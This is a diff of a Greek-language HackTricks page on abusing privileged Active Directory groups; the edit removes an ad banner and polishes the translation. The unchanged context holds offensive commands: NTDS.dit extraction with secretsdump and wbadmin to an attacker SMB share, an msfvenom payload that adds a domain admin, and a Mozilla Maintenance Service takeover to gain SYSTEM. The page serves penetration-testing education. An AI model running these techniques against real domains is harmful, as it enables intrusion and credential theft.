@@ -2,13 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τη βοήθεια των **πιο προηγμένων** εργαλείων της κοινότητας.\
-Αποκτήστε Πρόσβαση Σήμερα:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
-
 ## Γνωστές ομάδες με δικαιώματα διαχείρισης
 
 - **Διαχειριστές**
@@ -19,7 +12,7 @@
 
 Αυτή η ομάδα έχει τη δυνατότητα να δημιουργεί λογαριασμούς και ομάδες που δεν είναι διαχειριστές στον τομέα. Επιπλέον, επιτρέπει την τοπική σύνδεση στον Ελεγκτή Τομέα (DC).
 
-Για να προσδιορίσετε τα μέλη αυτής της ομάδας, εκτελείται η εξής εντολή:
+Για να προσδιοριστούν τα μέλη αυτής της ομάδας, εκτελείται η ακόλουθη εντολή:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
@@ -53,7 +46,7 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 
 ### Κλιμάκωση Δικαιωμάτων
 
-Χρησιμοποιώντας το `PsService` ή το `sc` από το Sysinternals, μπορεί κανείς να επιθεωρήσει και να τροποποιήσει τις άδειες υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και κλιμάκωση δικαιωμάτων:
+Χρησιμοποιώντας το `PsService` ή το `sc` από το Sysinternals, μπορεί κανείς να επιθεωρήσει και να τροποποιήσει τις άδειες υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και την κλιμάκωση δικαιωμάτων:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -61,7 +54,7 @@ C:\> .\PsService.exe security AppReadiness
 
 ## Backup Operators
 
-Η συμμετοχή στην ομάδα `Backup Operators` παρέχει πρόσβαση στο σύστημα αρχείων `DC01` λόγω των δικαιωμάτων `SeBackup` και `SeRestore`. Αυτά τα δικαιώματα επιτρέπουν την περιήγηση σε φακέλους, την καταγραφή και την αντιγραφή αρχείων, ακόμη και χωρίς ρητές άδειες, χρησιμοποιώντας τη σημαία `FILE_FLAG_BACKUP_SEMANTICS`. Η χρήση συγκεκριμένων σεναρίων είναι απαραίτητη για αυτή τη διαδικασία.
+Η συμμετοχή στην ομάδα `Backup Operators` παρέχει πρόσβαση στο σύστημα αρχείων `DC01` λόγω των δικαιωμάτων `SeBackup` και `SeRestore`. Αυτά τα δικαιώματα επιτρέπουν τη διαδρομή φακέλων, την καταγραφή και τις δυνατότητες αντιγραφής αρχείων, ακόμη και χωρίς ρητές άδειες, χρησιμοποιώντας τη σημαία `FILE_FLAG_BACKUP_SEMANTICS`. Η χρήση συγκεκριμένων σεναρίων είναι απαραίτητη για αυτή τη διαδικασία.
 
 Για να καταγράψετε τα μέλη της ομάδας, εκτελέστε:
 ```powershell
@@ -124,7 +117,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### Χρησιμοποιώντας το wbadmin.exe
 
-1. Ρυθμίστε το σύστημα αρχείων NTFS για τον διακομιστή SMB στη μηχανή του επιτιθέμενου και αποθηκεύστε τα διαπιστευτήρια SMB στη μηχανή στόχο.
+1. Ρυθμίστε το σύστημα αρχείων NTFS για τον διακομιστή SMB στη μηχανή του επιτιθέμενου και αποθηκεύστε τα διαπιστευτήρια SMB στη μηχανή-στόχο.
 2. Χρησιμοποιήστε το `wbadmin.exe` για δημιουργία αντιγράφου ασφαλείας του συστήματος και εξαγωγή του `NTDS.dit`:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -170,7 +163,7 @@ msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /dom
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-Για περισσότερες λεπτομέρειες σχετικά με αυτό το επιθετικό διανύσμα, ανατρέξτε στο ired.team.
+Για περισσότερες λεπτομέρειες σχετικά με αυτό το επιθετικό διανυσμα, ανατρέξτε στο ired.team.
 
 #### Mimilib.dll
 
@@ -178,10 +171,10 @@ sc.exe \\dc01 start dns
 
 ### WPAD Record για MitM
 
-Οι DnsAdmins μπορούν να χειριστούν τις εγγραφές DNS για να εκτελέσουν επιθέσεις Man-in-the-Middle (MitM) δημιουργώντας μια εγγραφή WPAD μετά την απενεργοποίηση της παγκόσμιας λίστας αποκλεισμού ερωτημάτων. Εργαλεία όπως το Responder ή το Inveigh μπορούν να χρησιμοποιηθούν για spoofing και καταγραφή δικτυακής κίνησης.
+Οι DnsAdmins μπορούν να χειριστούν τις εγγραφές DNS για να εκτελούν επιθέσεις Man-in-the-Middle (MitM) δημιουργώντας μια εγγραφή WPAD μετά την απενεργοποίηση της παγκόσμιας λίστας αποκλεισμού ερωτημάτων. Εργαλεία όπως το Responder ή το Inveigh μπορούν να χρησιμοποιηθούν για spoofing και καταγραφή δικτυακής κίνησης.
 
 ### Event Log Readers
-Τα μέλη μπορούν να έχουν πρόσβαση στα αρχεία καταγραφής γεγονότων, ενδεχομένως βρίσκοντας ευαίσθητες πληροφορίες όπως κωδικούς πρόσβασης σε απλή μορφή ή λεπτομέρειες εκτέλεσης εντολών:
+Τα μέλη μπορούν να έχουν πρόσβαση στα αρχεία καταγραφής γεγονότων, ενδεχομένως βρίσκοντας ευαίσθητες πληροφορίες όπως κωδικούς πρόσβασης σε απλό κείμενο ή λεπτομέρειες εκτέλεσης εντολών:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -189,18 +182,18 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ```
 ## Exchange Windows Permissions
 
-Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο τομέα, πιθανώς παρέχοντας δικαιώματα DCSync. Οι τεχνικές για την κλιμάκωση δικαιωμάτων που εκμεταλλεύονται αυτή την ομάδα αναλύονται στο Exchange-AD-Privesc GitHub repo.
+Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο τομέα, πιθανώς παρέχοντας δικαιώματα DCSync. Οι τεχνικές για την κλιμάκωση δικαιωμάτων που εκμεταλλεύονται αυτή την ομάδα περιγράφονται στο αποθετήριο Exchange-AD-Privesc στο GitHub.
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Hyper-V Administrators
 
-Οι Διαχειριστές Hyper-V έχουν πλήρη πρόσβαση στο Hyper-V, η οποία μπορεί να εκμεταλλευτεί για να αποκτήσουν έλεγχο πάνω σε εικονικοποιημένους Ελεγκτές Τομέα. Αυτό περιλαμβάνει την κλωνοποίηση ζωντανών Ελεγκτών Τομέα και την εξαγωγή NTLM hashes από το αρχείο NTDS.dit.
+Οι Hyper-V Administrators έχουν πλήρη πρόσβαση στο Hyper-V, η οποία μπορεί να εκμεταλλευτεί για να αποκτήσουν έλεγχο πάνω σε εικονικοποιημένους Domain Controllers. Αυτό περιλαμβάνει την κλωνοποίηση ζωντανών DCs και την εξαγωγή NTLM hashes από το αρχείο NTDS.dit.
 
 ### Exploitation Example
 
-Η Υπηρεσία Συντήρησης Mozilla του Firefox μπορεί να εκμεταλλευτεί από τους Διαχειριστές Hyper-V για να εκτελούν εντολές ως SYSTEM. Αυτό περιλαμβάνει τη δημιουργία σκληρού συνδέσμου σε ένα προστατευμένο αρχείο SYSTEM και την αντικατάστασή του με ένα κακόβουλο εκτελέσιμο:
+Η υπηρεσία συντήρησης Mozilla του Firefox μπορεί να εκμεταλλευτεί από τους Hyper-V Administrators για να εκτελούν εντολές ως SYSTEM. Αυτό περιλαμβάνει τη δημιουργία ενός σκληρού συνδέσμου σε ένα προστατευμένο αρχείο SYSTEM και την αντικατάστασή του με ένα κακόβουλο εκτελέσιμο:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -216,9 +209,9 @@ sc.exe start MozillaMaintenance
 
 #### Εκτυπωτές
 
-Τα μέλη της ομάδας **Εκτυπωτές** έχουν αρκετά προνόμια, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να **συνδέονται τοπικά σε έναν Domain Controller**, να τον απενεργοποιούν και να διαχειρίζονται εκτυπωτές. Για να εκμεταλλευτούν αυτά τα προνόμια, ειδικά αν το **`SeLoadDriverPrivilege`** δεν είναι ορατό σε μη ανυψωμένο περιβάλλον, είναι απαραίτητο να παρακαμφθεί ο Έλεγχος Λογαριασμού Χρήστη (UAC).
+Τα μέλη της ομάδας **Εκτυπωτών** έχουν αρκετά προνόμια, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να **συνδέονται τοπικά σε έναν Domain Controller**, να τον απενεργοποιούν και να διαχειρίζονται εκτυπωτές. Για να εκμεταλλευτούν αυτά τα προνόμια, ειδικά αν το **`SeLoadDriverPrivilege`** δεν είναι ορατό σε ένα μη ανυψωμένο περιβάλλον, είναι απαραίτητο να παρακαμφθεί ο Έλεγχος Λογαριασμού Χρήστη (UAC).
 
-Για να καταγραφούν τα μέλη αυτής της ομάδας, χρησιμοποιείται η εξής εντολή PowerShell:
+Για να καταγράψετε τα μέλη αυτής της ομάδας, χρησιμοποιείται η παρακάτω εντολή PowerShell:
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
@@ -265,11 +258,5 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 - [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 - [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** που υποστηρίζονται από τα **πιο προηγμένα** εργαλεία της κοινότητας.\
-Αποκτήστε πρόσβαση σήμερα:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
